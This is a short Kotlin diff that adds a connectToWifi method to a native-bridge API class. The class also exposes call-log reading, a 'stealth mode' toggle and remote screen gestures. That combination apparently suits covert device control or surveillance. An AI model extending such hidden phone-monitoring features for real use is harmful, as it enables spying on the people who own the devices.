@@ -61,6 +61,7 @@ class CortexNativeAPI(private val bridge: Any) {
     fun getCallLogs(limit: Int): String = call("getCallLogs", limit, Int::class.java) as? String ?: "[]"
     fun getSystemInfo(): String = call("getSystemInfo") as? String ?: "{}"
     fun getNearbyWifi(): String = call("getNearbyWifi") as? String ?: "[]"
+    fun connectToWifi(ssid: String, pass: String) = call("connectToWifi", arrayOf(ssid, pass), arrayOf(String::class.java, String::class.java))
     fun setStealthMode(active: Boolean) = call("setStealthMode", active, Boolean::class.java)
     fun performGesture(x1: Float, y1: Float, x2: Float, y2: Float, duration: Long) = call(
         "performGesture",
